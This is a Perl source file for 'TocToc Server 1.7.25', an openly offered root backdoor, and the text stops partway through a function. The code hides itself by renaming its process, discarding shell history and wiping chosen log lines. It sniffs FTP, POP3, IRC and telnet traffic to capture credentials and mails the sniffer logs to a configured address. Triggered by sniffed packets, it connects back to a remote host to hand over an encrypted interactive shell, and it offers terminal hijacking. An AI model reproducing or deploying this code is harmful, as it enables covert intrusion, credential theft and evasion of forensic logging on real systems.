   #!/usr/bin/perl
   # TocToc Server 1.7.25
   #
   #     0ldW0lf - oldwolf@atrixteam.net
   #             - old-wolf@zipmail.com
   #             - www.atrixteam.net
   #
   #
   #######################################################################
   #-------------------------- CONFIGURATION ----------------------------#
   #######################################################################
   my $pass = 'T/9KuylQBq/mg';       # Crypted password.                 #
   #---------------------------------#####################################
   my $MAIL = 'old-wolf@zipmail.com';# Administrator mail, which gonna   #
                                     # be used to send the sniffer logs  #
                                     # and notifications operations.     #
   #---------------------------------#####################################
   my @MX = (                        # MX host(s) of the mail server.    #
   "mail.zipmail.com"                # type: host -t mx mail-server.com  #
   );                                # eg.: host -t mx zipmail.com       #
                                     # and put it in the @MX array.      #
   #---------------------------------#####################################
   my $proc_name = 'TocToc';         # Process name                      #
   #---------------------------------#####################################
   my $home = "/tmp";                # HOME directory.                   #
   #---------------------------------#####################################
   my $SHELL = "/bin/bash";          # Default shell bin location.       #
   #---------------------------------#####################################
   my @bashrc = (                    # The bashrc lines gonna be written #
     'alias ls=\'ls $LS_OPTIONS\'',  # in "$home/.bashrc before a shell  #
     "alias vi=\'if [ -x \"/usr/bin".# be spawned and deleted after it.  #
     "/vim\" ] || [ -x \"/bin/vim\"".#                                   #
     " ]; then VI=\"vim\"; else ".   #                                   #
     "VI=\"vi\";fi; \$VI'"           #                                   #
   );                                #                                   #
   #---------------------------------#####################################
   my @commands = (                  # Commands to be executed before    #
   'cat /etc/issue.net 2> /dev/null',# run $shell you can also use ';'   #
   'id',                             # to separate them, E.g:            #
   'uname -a');                      # my @commands = ('id;uname -a');   #
   #---------------------------------#####################################
   my @init_commands = (             # start up commands: commands that  #
   #  "COMMAND1", "COMMAND2", "..."  # will be executed when the backdoor#
      );                             # start up.                         #
   #---------------------------------#####################################
   my $max_idle = 40;                # Max. time in minutes a user can   #
                                     # be idle.                          #
   #---------------------------------#####################################
   my $pid_file = "$home/.toc.pid";  # PID file gonna be written only if #
                                     # especifyed.                       #
   #---------------------------------#####################################
   my $never_give_up = 1;            # Never give up to snif a interface #
                                     # 1/0 to enable/disable.            #
   #---------------------------------#####################################
   my $Hertz = 100;                  # Kernel clock tick rate to convert #
                                     # the start time of a process into  #
                                     # the UNIX epoch time. 100 is the   #
                                     # Linux standard, you can also look #
                                     # in /usr/include/asm/param.h for   #
                                     # its value. Not necessary, thougth.#
   #---------------------------------#####################################
   my $UDP_DELAY = 0.3;              # Delay between the packets send    #
                                     # lower value  - fast with probably #
                                     #                errors             #
                                     # higher value - slow but probably  #
                                     #                less or none errors#
   #######################################################################
   #------------------------ WIPE DEFINETIONS ---------------------------#
   #######################################################################
   my %WIPE;                         # ********************************* #
   #---------------------------------#####################################
   $WIPE{'/var/log/messages'} =      # $WIPE{"some_file"} = "what to     #
   "obsolete promiscuous 200.3.4.5"; # wipe";                            #
   $WIPE{'/var/log/secure'} =        # The lines with words in the key   #
   "200.3.4.5";                      # value gonna be wiped off from the #
                                     # file.                             #
   #---------------------------------#####################################
   $WIPE{TIME} = 3600;               # Every X seconds the files gonna   #
                                     # be wiped.                         #
   #######################################################################
   #---------------------- SNIFFER CONFIGURATION ------------------------#
   #######################################################################
   my %SNIF;                         # ********************************* #
   #---------------------------------#####################################
   $SNIF{DIR} = "$home/.snif";       # Directory of the snif logs        #
   #---------------------------------#####################################
   $SNIF{TCP} = "21,110,6667";       # TCP ports to be sniffed.          #
   #---------------------------------#####################################
   $SNIF{UDP} = "3049";              # UDP ports to be sniffed.          #
   #---------------------------------#####################################
   $SNIF{ICMP} = 0;                  # 0/1 to enable/disable ICMP snif.  #
   #---------------------------------#####################################
   $SNIF{TELNET} = 1;                # A special parsing for telnet      #
                                     # connections to organize the data. #
                                     # I wouldn't put 0 here ;)          #
   #---------------------------------#####################################
   $SNIF{TELNET_LOG} = "snif.telnet";# Log file of the Telnet snif.      #
   #---------------------------------#####################################
   $SNIF{lo} = 1;                    # 0/1 to enable/disable sniffing on #
                                     # the loopback interface (lo)       #
                                     # I would just set 1 here for local #
                                     # testes only ;)                    #
   #######################################################################
   # You can also use "all" to sniff all ports of a protocol, ig:        #
   # $SNIF{TCP} = "all";                                                 #
   #######################################################################
   $SNIF{SEND_MAIL} = 1;             # 1/0 to enable/disable mail sending#
   #---------------------------------#####################################
   $SNIF{REMOVE_ENT} = 1;            # Remove the \n or \r\n from the    #
                                     # end of the packet data before     #
                                     # writting the log file.            #
                                     # 1/0 to enable/disable.            #
   #---------------------------------#####################################
   $SNIF{ERASE_AFTER_MAIL} = 1;      # Erase logs after mail?            #
                                     # 1/0 to enable/disable.            #
   #---------------------------------#####################################
   $SNIF{MAIL_TIME} = 86400;         # Time in seconds to the mails be   #
                                     # sended, default 86400 (1 day).    #
   #---------------------------------#####################################
   $SNIF{LOG_FILE} =                 # How the logs filename gonna be    #
   "snif.{PROTO}.{SERVNAME}";        # created, you can use the Snif Vars#
                                     # if none Snif vars were used, the  #
                                     # logs gonna be written in the same #
                                     # file.                             #
   #---------------------------------#####################################
   $SNIF{LOG_LINE} =                 # How the lines in the logs gonna   #
   "[{IFACE} ({PROTO})] ".           # be written.                       #
   "{SRCIP}:{SRCPORT} ({SRCNAME})".  # You have to use the Snif Vars.    #
   " -> ".                           # See Snif Vars bellow.             #
   "{DSTIP}:{DSTPORT} ({DSTNAME})".  #                                   #
   " [{LOCALTIME}]\n{DATA}\n".       #                                   #
   "-------------------------------";#                                   #
   #######################################################################
   #  SNIF VARIABLES :                                                   #
   #---------------------------------------------------------------------#
   # {SRCIP}       - Source IP address                                   #
   # {SRCPORT}     - Source port                                         #
   # {SRCNAME}     - Source IP resolved name                             #
   #                                                                     #
   # {DSTIP}       - Destination IP address                              #
   # {DSTPORT}     - Destination port                                    #
   # {DSTNAME}     - Destination IP resolved name                        #
   #                                                                     #
   # {SRCMAC}      - Source MAC address                                  #
   # {DSTMAC}      - Destination MAC address                             #
   #                                                                     #
   # {ICMP_TYPE}   - (Guess)                                             #
   # {ICMP_CODE}   - (Guess)                                             #
   #                                                                     #
   # {DATA}        - The data of the packet                              #
   # {PROTO}       - Protocol                                            #
   # {IFACE}       - Captured packet interface                           #
   # {SERVNAME}    - The name of the daemon server of the port, eg       #
   #                 PORT - Service name                                 #
   #                   23 - telnet                                       #
   #                   25 - smtp                                         #
   #                                                                     #
   # {PACKETSIZE}  - Size of the packet                                  #
   # {DATASIZE}    - Size of the data in the packet                      #
   # {PACKET}      - Hole packet (IP and protocol header)                #
   #                                                                     #
   # {HOUR}        - (Guess)                                             #
   # {MINUTE}      - (Guess)                                             #
   # {SECOND}      - (Guess)                                             #
   # {MONTH}       - (Guess)                                             #
   # {DAY}         - (Guess)                                             #
   # {YEAR}        - (Guess)                                             #
   # {LOCALTIME}   - Localtime formated in HH:MM:SS MM/DD/YYYY           #
   # {TIME}        - Unix epoch time in seconds                          #
   #                                                                     #
   #######################################################################

   ####################################
   # You can change the ENV stuff too #
   ####################################

   #### ENVironment ####
   $ENV{HOME}       = $home;
   #$ENV{PS1}        = '[\u@\h \W]: '; # the way i like :)
                    # colorful PS1 is also funny :)
   $ENV{PS1}        = '\[\033[3;36m\][\[\033[3;34m\]\[\033[1m\]\u\[\033[3;36m\]@\[\033[0m\]\[\033[3;34m\]\[\033[1m\]\h \[\033[0m\]\[\033[1m\]\W\[\033[0m\]\[\033[3;36m\]]\[\033[0m\]\[\033[1m:\[\033[0m\] ';
   $ENV{MAIL}       = '/var/mail/root';
   $ENV{HISTFILE}   = '/dev/null';
   $ENV{USER}       = 'root';
   $ENV{LOGNAME}    = 'root';
   $ENV{LS_OPTIONS} = ' --color=auto -F -b -T 0';
   $ENV{LS_COLORS}  = 'no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:ex=01;32:*.cmd=01;32:*.exe=01;32:*.com=01;32:*.btm=01;32:*.bat=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.bz2=01;31:*.rpm=01;31:*.deb=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.jpg=01;35:*.gif=01;35:*.bmp=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.mpg=01;37:*.avi=01;37:*.mov=01;37:';
   $ENV{SHELL}      = $SHELL;
   $ENV{TERM}       = 'xterm';
   $ENV{HZ}         = $Hertz;
   #####################

   ####################################
   ### Don´t make any change unless ###
   ### you know what you are doing  ###
   ####################################
   exit() if ($> != 0); # root only!


   my $MYOUT = \*STDOUT;       # yeah.. we save the old stdout and
   my $MYERR = \*STDERR;       # stderr and close the usual FH so
   my $MYIN  = \*STDIN;        # there is no way to print messages
   open(STDOUT,"> /dev/null"); # to then when something fail
   open(STDERR,"> /dev/null"); #
   open(STDIN,"< /dev/null");

   # Modules needed #
   use Net::RawIP;
   use NetPacket::IP qw(:strip);
   use NetPacket::Ethernet qw(:strip :types);
   use NetPacket::TCP;
   use NetPacket::UDP;
   use NetPacket::ICMP;
   use IO::Pty;
   use IO::Socket;
   use IO::Select;
   use LWP::UserAgent;
   use MIME::Lite;
   use Crypt::CBC;
   use Cwd;

   # Not really necessary modules

   # I gonna use system instead.. if it
   # doesn't work then i use the module
   safeload('IO::Stty');

   # to use ioctl
   safeload('sys/ioctl.ph', 1);
   safeload('asm/ioctls.ph', 1);

   # get the local hostname
   safeload('Sys::Hostname');

   # some informations about the net devices
   safeload('IO::Interface');

   # to set the screen size
   safeload('Term::ReadKey');

   # disk infos
   safeload('Filesys::Df');

   use strict;

   #use Net::DNS; # nah Net::DNS doesn't work in old perl version coz of the XSLoader
                  # so I remove it and you specify the MX hosts (thats why I was using
                  # this module :P
   ##################

   #####################################################
   # Probably you don´t wanna change the signals stuff #
   #####################################################

   # DO NOT ADD SIG{INT} HERE
   ###### SIGnals ######
   $SIG{TERM} = 'IGNORE';
   $SIG{CHLD} = 'IGNORE';
   $SIG{HUP}  = \&restart;
   $SIG{ALRM} = \&restart;
   #####################


   my $SELF = self_file();
   chdir("/");

   #my $PERLVER = sprintf("%vd", $^V); # but old versions :/
   # dammit!!!!!
   my ($ver, $res);
   $ver = "$1.$3" if ($] =~ /^(\d+)\.(0{2})(\d{1})(.*)/);
   $res = $4;
   if ($res =~ /^(0{2})(\d+)/) {
     $ver .= ".$2";
   } elsif ($res =~ /^(\d{1})(\d+)/) {
     $ver .= ".$2$1";
   }
   $ver .= ".0" unless ($ver =~ /(\d+\.){2}/);
   my $PERLVER = $ver;

   # defining TIOCSTI
   my $ioctl_ok = 1;
   unless (defined(&TIOCSTI)) {
     if (open(IOD, "< /usr/include/asm/ioctls.h")) {
       while(<IOD>) {
         if (/^\#define\s+TIOCSTI\s+(.*?)\n$/) {
           eval "sub TIOCSTI () {$1;}";
           last;
         }
       }
       close(IOD);
     }

     unless (defined(&TIOCSTI)) {
       eval 'sub TIOCSTI () {0x5412;}';
       $ioctl_ok = 0;
     }
   }

   # WIPING the files....
   wipe(%WIPE);
   my $wipe_last_run = time;

   # Executing the start up commands
   foreach my $command (@init_commands) {
      system("$command&"); # backgrounded => &
   }

   # Some defines
   my $VERSION = "1.7.25";
   my $INITTIME = time; # $^T ? eheh
   my $buffer = 1024;
   my $lbuffer = 4096; #large buffer
   my $EOC = "\001\004\003\002"; # END OF CRYPT string
   $SNIF{LAST_SENT_MAIL} = time;
   $max_idle *= 60;
   my $ALARM = 100;
   my $iface_check = 10; # time between checks.. if the interfaces and sniffers are ok
   my $last_iface_check = time;
   my $dns_erase = 36000; # 10 hours then i flush the %DNS
   my $last_dns_erase = time;

   # defining some vars/hashs/arrays
   my (%DNS, $MAIN_PID, %CLIENT, $connections,%TELNET, %SNIFFER,
   %IFACES, @STARTED_IFACES, $sel_serv, $sel_shell, $snif);

   ## Snif defines...
   my $psize = 1500;
   my $ptout = 10;
   my ($offset, $psck, $p, @p);
   my $pfil = "tcp or udp or icmp";

   # for telnet sniffing...
   my @rchars = ('A' .. 'Z', 'a' .. 'z', '0' .. '9', "\"", "\'", '!','@','#','$','%','&','*','(',')','-','+','=','_',"\|","\\","\`", '{', '}', '[', ']', '~', '^', ':', ';', "\,", '<', '>', '.', '/', '?', 'ç', 'Ç');

   # start
   main();



   #################
   # MAIN FUNCTION #
   #################
   sub main {
     pipe(SNIF_RDR, SNIF_WTR) || restart();
     pipe(DRDR, DWTR) || restart();

     select(SNIF_WTR);$| = 1;
     select(STDERR);

     my $pid=fork;
     exit if $pid;

     $0=$proc_name."\0";

     $sel_serv = IO::Select->new();
     $sel_shell = IO::Select->new();
     $snif = IO::Select->new(\*SNIF_RDR);

     # writting PID file
     if (defined($pid_file) and $pid_file ne '') {
       open(PID, "> $pid_file");
       print PID "$$\n";
       close(PID);
     }

     (%DNS, %SNIFFER, %CLIENT, %TELNET) = ();
     %IFACES = get_ifaces();
     $MAIN_PID = $$;
     $connections = 0;


     # making some traffic to the kids see us
     open(ROUTE, "/proc/net/route");
     foreach my $iface (keys(%IFACES)) {
       seek(ROUTE, 0, 0);

       my $ipa = $IFACES{$iface};
       my @ipb = split(/\./, $ipa);;
       $ipb[3]++;
       my $ipb = join('.', @ipb);

       while (<ROUTE>) {
         if (/^$iface\s+.+?\s+(.+?)\s+/ and $1 ne '00000000') {
           $ipb = hexaddr($1);
           last;
         }
       }

       my $t = new Net::RawIP({ ip => {}, tcp => {} });
       $t->set({ip => { saddr => $ipa, daddr => $ipb }});
       $t->set({tcp => { source => int(rand(65535)), dest => int(rand(65535))} });
       $t->send(0.1, 2);
     }
     close(ROUTE);

     # starting the sniffer...
     while ( 1 ) {
       last if (init_sniffer());
       exit if ($never_give_up != 1);

       sleep(1);
     }

     #############
     # MAIN LOOP #
     #############
     while ( 1 ) {
       alarm($ALARM);

       my @clis = keys(%CLIENT);
       select(undef, undef, undef, 0.1) if (scalar(@clis) == 0); # avoid CPU burning
                                                                 # when none client
                                                                 # is connected

       &check_rotine;

       if (my $sniffers = ($snif->can_read(0.01))[0]) {
          my $lines;
          my $nread = sysread($sniffers, $lines, $lbuffer);

          foreach my $line (split("$EOC\n", $lines)) {
            if ($line =~ /^CONN/) {
              my $args = $line;
              $args =~ s/^CONN\s+//;
              my @args = split(':', $args);
              my $gl = $args[9];

              $args =~ s/^(.*?\:){10}//;
              my @key = split('', $args);

              next if ($key[$gl] ne ':');
              my $key = join('', @key[0 .. ($gl-1)]); # no mistakes if
                                                      # we got more than one
                                                      # msg together

              undef($key) if ($args[9] =~ /^00/);
              $args[9] = $key;
              undef($args[10]);
              open_conn(@args) if (!$key or ($key and $gl == length($key))); # ??? ehhee CORRECTED!!
            }
          }
       }

       foreach my $cli (@clis) {
          my $idle_time = time - $CLIENT{$cli}->{last_msg};
          finish_client($CLIENT{$cli}->{sock}, "\n\nIdle time exceeded.\n\n") if ($idle_time > $max_idle);
       }

       my @ready = $sel_serv->can_read(0.01);
       foreach my $fh (@ready) {
         my ($msg, $nread);

         my ($proto_cli, $is_udp);
         map { $proto_cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{proto} eq $fh) } keys %CLIENT;
         map { $is_udp = 1 if ($CLIENT{$_}->{proto} eq $fh and $CLIENT{$_}->{protocol} eq "udp") } keys %CLIENT;
         $is_udp = ((defined($CLIENT{$fh}) and $CLIENT{$fh}->{protocol} eq "udp") ? 1 : $is_udp);


         if ($is_udp) {
           $nread = $fh->recv($msg, $buffer);
         } else {
            $nread = sysread($fh, $msg, $buffer);
         }


         if ($nread == 0 and !$is_udp) {
           if (defined($CLIENT{$fh})) {
             close_client($fh);
           } elsif (defined($proto_cli)) {
              close_client($proto_cli);
           }
         } elsif (not defined($CLIENT{$fh})) {
             # protocols messages
             next unless(defined($proto_cli));
             ttp_parse($proto_cli, $msg);
         } elsif ($CLIENT{$fh}->{logged} == 1) {
             $CLIENT{$fh}->{last_msg} = time;
             $CLIENT{$fh}->{buf} .= $msg;

             if (defined($CLIENT{$fh}->{cipher})) {
               my $cipher = $CLIENT{$fh}->{cipher};

               while ( my $crpt_msg = get_crypt($fh) ) {
                 last if ($crpt_msg eq '');
                 my $decrypt = $cipher->decrypt($crpt_msg);
                 write_shell($CLIENT{$fh}->{shell}, $decrypt);
               }

             } else {
                 write_shell($CLIENT{$fh}->{shell}, $CLIENT{$fh}->{buf});
                 $CLIENT{$fh}->{buf} = '';
             }
         }
       }

       read_shells();

     }
   }


   #############
   # MAIN SUBs #
   #############

   sub check_rotine {
     if (defined($SNIF{SEND_MAIL}) and $SNIF{SEND_MAIL} == 1 and (time-$SNIF{LAST_SENT_MAIL}) >= $SNIF{MAIL_TIME}) {
       $SNIF{LAST_SENT_MAIL} = time;

       my %INF;
       $INF{PROTO} = "(udp|tcp|icmp|UDP|TCP|ICMP)";
       $INF{DSTPORT} = "(\\d+)";
       $INF{SRCIP} = "(\\d+\\.\\d+\\.\\d+\\.\\d+)";
       $INF{DATA} = '(.+?)';
       $INF{IFACE} = "(\\S+)";
       $INF{SERVNAME} = '(.*?)';
       $INF{SRCPORT} = $INF{PACKETSIZE} = $INF{DATASIZE} = $INF{DSTPORT};
       $INF{DSTIP} = $INF{SRCIP};
       $INF{DSTNAME} = $INF{SRCNAME} = $INF{IFACE};

       my $string = convert_string($SNIF{LOG_FILE}, %INF);
       opendir(DIR, $SNIF{DIR});
       my @files = readdir(DIR);
       closedir(DIR);
       my @snif = grep { $_ =~ /^($string)$/ and -e $SNIF{DIR}."/$_" } @files;
       @snif = grep { $_ = $SNIF{DIR}."/$_" } @snif;

       if (@snif) {
         my $pid = fork();
         unless ($pid) {
           for (my $c=0; $c < 10; $c++) {
             my $sent = mail($MAIL, "TocToc: Sniffer logz", "Sniffer log files: ".join(', ', @snif)."\nLocal time: ".localtime(time)."\nUPtime: ".uptime(), @snif);
             if ($sent) {
               unlink(@snif) if (defined($SNIF{ERASE_AFTER_MAIL}) and $SNIF{ERASE_AFTER_MAIL} == 1);
               exit;
             }
           }
           exit;
         }
       }
     }

     if ((time-$last_iface_check) >= $iface_check) {
       $last_iface_check = time;
       %IFACES = get_ifaces();

       my $run_init = 0;

       foreach my $iface (keys(%IFACES)) {
         next if ($iface =~ /^.+?:\d+$/); # ethX:Y
         next if ($iface eq "lo" and $SNIF{lo} == 0);

         $run_init = 1 if (not defined($SNIFFER{$iface}) or $SNIFFER{$iface}->{ok} == 0);
       }

       foreach my $iface (keys(%SNIFFER)) {
         my $pid = $SNIFFER{$iface}->{PID};
         unless (kill(0, $pid)) { # exited or killed
           $SNIFFER{$iface}->{ok} = 0;
           $run_init = 1;
         }

       }

       init_sniffer() if ($run_init == 1);
     }

     if ((time-$wipe_last_run) >= $WIPE{TIME}) {
       $wipe_last_run = time;
       wipe(%WIPE);
     }

   }

   sub get_crypt {
     my $cli = shift;
     my $msg = $CLIENT{$cli}->{buf};

     return(undef) unless ($msg =~ /$EOC/);

     my @crypt_msgs = split("$EOC", $msg);
     my $crypt_msg = $crypt_msgs[0];

     my $new_msg;
     if ($#crypt_msgs > 0) {
       $new_msg = join("$EOC", @crypt_msgs[1 .. $#crypt_msgs]);
       $new_msg .= "$EOC" if ($msg =~ /$EOC$/);
     }

     $CLIENT{$cli}->{buf} = $new_msg;
     return($crypt_msg);
   }

   sub open_conn {
     my ($ip, $port, $udpp, $sip, $sport, $psip, $psport, $protocol, $options, $key) = @_;
     my $shell = $SHELL;

     foreach my $option (split('_', $options)) {
       $option =~ /^(\S)(.*?)$/;
       my $opt = $1;
       my $arg = $2;
       if ($opt eq "s") {
         $shell = $arg;
       } elsif ($opt eq "f") {
          $shell = "fucked-mode";
       }
     }

     my %new = (Proto=>"$protocol", PeerAddr=> $ip, PeerPort=>$port, Timeout => 10);
     $new{LocalAddr} = $sip if ($sip);
     $new{LocalPort} = $sport if ($sport);

     my $sock = IO::Socket::INET->new( %new ) || return(undef);
     $sock->autoflush(1);
     $sel_serv->add($sock);
     $CLIENT{$sock}->{sock} = $sock;

     $CLIENT{$sock}->{logged} = 1;
     $CLIENT{$sock}->{login_time} = time;
     $CLIENT{$sock}->{last_msg} = time;
     $CLIENT{$sock}->{cipher} = new Crypt::CBC($key, 'DES_EDE3') if (defined($key));
     $CLIENT{$sock}->{buf} = "";
     $CLIENT{$sock}->{protocol} = $protocol;
     $CLIENT{$sock}->{udpn} = 0;

     # opening the protocol socket
     if ($protocol eq "tcp" or $protocol eq "udp") {
       my $pport = ($protocol eq "udp" ? $udpp : $port);

       my %new = (Proto=>"$protocol", PeerAddr=> $ip, PeerPort=>$pport, Timeout => 15);
       $new{LocalAddr} = $psip if ($psip);
       $new{LocalPort} = $psport if ($psport);

       my $proto = IO::Socket::INET->new( %new );
       unless(defined($proto)) {
         write_client($sock, "\nShit! The protocol connection could not be estabilished!\nTry to reconnect.\n\n");
       } else {
           $CLIENT{$sock}->{proto} = $proto;
           $sel_serv->add($proto);
           $proto->send("OK!\n");
           write_client($sock, "\nTocToc Protocol connection estabilished!\n\n");
       }
     } else {
        write_client($sock, "\nProtocol connection is only supported in TCP and UDP connections.\nYou cannot use TocToc remote commands.\n\n");
     }

     new_shell($sock, $shell);

   }


   # SHELLs #
   sub read_shells {
     map { read_shell($_) } ($sel_shell->can_read(0.01));
   }

   sub read_shell {
     my $shell = shift;
     my $cli;
     my $msg = '';
     map { $cli = $CLIENT{$_}->{sock} if ($CLIENT{$_}->{shell} eq $shell) } keys %CLIENT;

     my $read = sysread($shell, $msg, $lbuffer);
     if ($read == 0 or not defined($cli)) {
       finish_client($cli, "\nTerminal closed.\n");
       $shell->close;
       $sel_shell->remove($shell);
     } else {
        write_client($cli, $msg);
     }
   }

   sub new_shell {
     my ($cli, $shell) = @_;
     my $pty = new IO::Pty;

     my $bashrc_file = $ENV{HOME}."/.bashrc";
     $bashrc_file =~ s/^\/\//\//;

     unless ($pty) {
       finish_client($cli, "ERRO: There is no device available.\n");
       return(undef);
     }

     unless (pipe(PR, CW)) {
       finish($cli, "ERRO: Could not create a pipe.\n");
       return(undef);
     }

     select(PR); $| = 1;

     my $pid = fork();

     finish_client($cli, "ERROR: fork()\n") if (not defined($pid));


     unless ($pid) {
       syswrite(CW, $$, length($$));

       close(PR);
       close(CR);

       my $slave = $pty->slave();
       $pty->slave->set_raw();

       $pty->make_slave_controlling_terminal();
   #    my $slave = $pty->slave();
       close $pty;

       $slave->set_raw();

       unless (open($MYIN,"<&". $slave->fileno())) {
         finish_client($cli,"Couldn't reopen STDIN for reading.\n");
         exit;
       }
       unless (open($MYOUT,">&". $slave->fileno())) {
          finish_client($cli, "Couldn't reopen STDOUT for writing.\n");
          exit;
       }
       unless (open($MYERR,">&". $slave->fileno())) {
         finish_client($cli, "Couldn't reopen STDERR for writing.\n");
         exit;
       }
       select($MYOUT); $| = 1;
       select($MYERR); $| = 1;
       select($MYIN); $| = 1;

       close $slave;

       doit("ReadMode", 0);

       sleep 1;
       my $sttyok = -1;
       foreach my $stty ("/bin/stty", "/usr/bin/stty") {
         next unless (-x $stty);
         $sttyok = system("$stty", "sane");
       }
       eval { doit("IO::Stty::stty", $MYIN, "sane"); } if ($sttyok == -1);

       chdir("$home");

       # writing out .bashrc
       if (open(BRC, "> $bashrc_file")) {
         print BRC join("\n", @bashrc);
         close(BRC);
       }


       unless ($shell eq "fucked-mode") {
         my $command = join(';', @commands);
         if (defined($command)) {
            eval { system("$command"); };
         }

         { exec ("$shell")  };

         syswrite($MYOUT, "\n\nERROR: exec($shell)\n\nI could not execute the shell ($shell)\nHowever you are lucky :P\nYou can use the \"TocToc I'm FUCKED!\" mode and fix up this thing...\nYou still can use the TocToc Commands (type ^H)\nTip: Find some bash and execute it ;)\n\n");
       }

       syswrite($MYOUT, "\n\nOK! I'm Fucked mode.\n");
       syswrite($MYOUT, "Type ^C to exit\n\nI'm FuCKeD!# ");

       while (my $msg = <$MYIN>) {
         $msg =~ s/\n$//;
         $msg =~ s/\r$//; # nahh.. i dont believe so

         if ($msg =~ /^\s*cd\s+(\S+)/) {
           my $notf = "directory $1 not found!\n";
           chdir($1) || syswrite($MYOUT, $notf, length($notf));
         } else {
            system("$msg");
         }
         syswrite($MYOUT, "I'm FuCKeD!# ");
       }

       exit;
     }

     sysread(PR, $CLIENT{$cli}->{SHELL_PID}, $buffer);

     close(PR);
     close(CR);

     $pty->close_slave();
     $pty->set_raw();
     $CLIENT{$cli}->{shell} = $pty;
     $sel_shell->add($pty);

     for (my $c = 0; $c <= 2; $c+=0.2) {
       select(undef, undef, undef, 0.2);
       last if (unlink("$home/.bashrc"));
     }

   }

   sub write_shell {
     my ($shell, $msg) = @_;
     return unless($shell);

     foreach my $m (split_chars($msg, 100)) {
       read_shells();
       syswrite($shell, $m, length($m));
       read_shells();
     }

     return(1);
   }
   ###########

   sub split_chars {
     my ($msg, $nchars) = @_;

     my @splited;
     my @chrs = split ('', $msg);
     my $done = 0;
     while ( 1 ) {
       my $splited = join('', @chrs[$done .. ($done+$nchars-1)]);
       $done += $nchars;
       last unless ($splited);
       push(@splited, $splited);
     }
     return(@splited);
   }


   # CLIENTS #
   sub write_client {
      my ($cli, $msg, $proto) = @_;

      my ($socket, $cipher) = (
         ( $proto ? (defined($CLIENT{$cli}->{proto}) ? $CLIENT{$cli}->{proto} : undef): $CLIENT{$cli}->{sock} ),
         ( $proto ? undef : (defined($CLIENT{$cli}->{cipher}) ? $CLIENT{$cli}->{cipher} : undef) )
      );

      if (defined($CLIENT{$cli}->{cipher})) {
        my $cipher = $CLIENT{$cli}->{cipher};
        $msg = $cipher->encrypt($msg)."$EOC" unless ($proto);
      }

      return(undef) if (not defined($socket));

      return(write_tcp_client($socket, $msg))
         if ($CLIENT{$cli}->{protocol} eq "tcp");
      return(write_udp_client($socket, $msg))
         if ($CLIENT{$cli}->{protocol} eq "udp");
   }

   sub write_tcp_client {
      my ($socket, $msg) = @_;

      foreach my $m (split_chars($msg, 1024)) {
         syswrite($socket, $m, length($m));
      }

      return(1);

   }

   sub write_udp_client {
      my ($socket, $msg) = @_;

      my @send = split ('', $msg);
      my $sent = 0;

      while ( 1 ) {
        my $send_now = join('', @send[$sent .. ($sent+$buffer-1)]);
        last if (!$send_now);
        $sent += $buffer;
        select(undef, undef, undef, $UDP_DELAY);
        $socket->send($send_now);
      }

      return(1);
   }

   sub finish_client {
     my ($cli, $msg) = @_;
     write_client($cli, $msg);
     close_client($cli);
   }

   sub close_client {
     my $cli = shift;

     $sel_serv->remove($cli);

     if (defined($CLIENT{$cli}->{shell})) {
       my $shell = $CLIENT{$cli}->{shell};
       $sel_shell->remove($shell);
       close($shell);
       my $shell_pid = $CLIENT{$cli}->{SHELL_PID};
       kill(9, $shell_pid) if (kill(0, $shell_pid));
     }
     my $proto = $CLIENT{$cli}->{proto};
     $sel_serv->remove($proto) if ($proto);

     shutdown($proto, 2) if ($proto);
     shutdown($cli, 2)   if ($cli);

     delete($CLIENT{$cli});
   }

   sub spm_done {
      my ($cli, $cmd, @msg) = @_;
      spm($cli, $cmd, @msg) if(@msg);
      spm($cli, $cmd, "DONE");
   }

   sub spm {
     my ($cli, $cmd, @ans) = @_;

     my $send;
     foreach my $ans (@ans) {
       $send .= "\001T:$cmd $ans:\002\n";
     }
     write_client($cli, $send, 1);
   }

   # Parsing the protocol messages...
   sub ttp_parse {
     my ($cli, $msg) = @_;
     my $shell = $CLIENT{$cli}->{shell};
     my $proto = $CLIENT{$cli}->{proto};
     if ($msg =~ /\001T:(.+?)\s(.*):\002\n/) {
       while ($msg =~ m/\001T:(.+?)\s(.*):\002\n/g) {
         my $cmd  = $1;
         my $arg  = $2;
         my @args = split(/ +/, $arg);
         if ($arg eq "ABORT") {
           if ($cmd eq "DOWNLOAD") {
             my $pipe = $CLIENT{$cli}->{DOWNLOAD_PIPE} if (defined($CLIENT{$cli}->{DOWNLOAD_PIPE}));
             if (defined($pipe)) {
                print $pipe "ABORT\n";
                close($pipe);
                delete($CLIENT{$cli}->{DOWNLOAD_PIPE});
             }
   #          } elsif ($cmd eq "OPEN") {
   #              exit if ($$ != $MAIN_PID);
           } elsif ($cmd eq "ATTACK") {
               my $apid = $CLIENT{$cli}->{ATTACK_PID};
               kill(9, $apid) if (kill(0, $apid));
               delete($CLIENT{$cli}->{ATTACK_PID});
           }
           next;
         }
         if ($cmd eq "TERM_SIZE") {
           return() if (not defined($shell) or scalar(@args) != 4);

           eval { doit("SetTerminalSize", @args, $shell); };

           write_client($cli, "\nTerminal size has changed.\n\n") if (defined($CLIENT{$cli}->{termsize}));
           $CLIENT{$cli}->{termsize} = "@args";
         } elsif ($cmd eq "HIJACK") {
             my $chars = join(" ", @args[1 .. $#args]);
             hijack($cli, $args[0], $chars);
         } elsif ($cmd eq "SYSINFO") {
             my @send = sysinfo();
             spm_done($cli, $cmd, @send);
         } elsif ($cmd eq "W") {
             my @ttynames;
             map { push(@ttynames, $CLIENT{$_}->{shell}->ttyname) } keys(%CLIENT);

             my %PROC = w_procps(@ttynames);
             spm($cli, $cmd, "USER          TTY            FROM     LOGGED    IDLE  WHAT");

             foreach my $client (keys(%CLIENT)) {
               my $cli_sock = $CLIENT{$client}->{sock};
               my $cli_shell = $CLIENT{$client}->{shell};

               my $idle = time - $CLIENT{$client}->{last_msg};
               my $show_idle = stat_time($idle);

               my $login = time - $CLIENT{$client}->{login_time};
               my $show_login = stat_time($login, "h");

               my $ttyname = $cli_shell->ttyname;
               $ttyname =~ s/^\/dev\/(.*)/$1/;

               my $show_starttime = stat_time((time-$PROC{$ttyname}{starttime}), "h");

               my $user = getpwuid($PROC{$ttyname}{UID});

